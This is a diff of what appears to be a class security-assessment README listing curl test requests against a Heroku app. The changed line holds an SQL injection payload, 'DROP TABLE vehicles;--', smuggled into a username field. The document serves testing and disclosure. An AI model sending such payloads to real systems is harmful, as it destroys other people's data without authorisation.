@@ -18,7 +18,7 @@ Note: While we were not particularly asked to show our curl requests for our Sec
     -X POST https://jordan-marsh.herokuapp.com/rides
   
 <b>SQL Injection</b>  
-   - curl -d "username= whatever; DROP vehicles;&lat=34342.944&lng=943432.32345" -X POST https://jordan-marsh.herokuapp.com/update
+   - curl -d "username= whatever’; DROP TABLE vehicles;--&lat=34342.944&lng=943432.32345" -X POST https://jordan-marsh.herokuapp.com/update
 
 <b>General Privacy</b>
   - curl -d "username=a&lat=34342.944&lng=943432.32345" -X POST https://jordan-marsh.herokuapp.com/rides
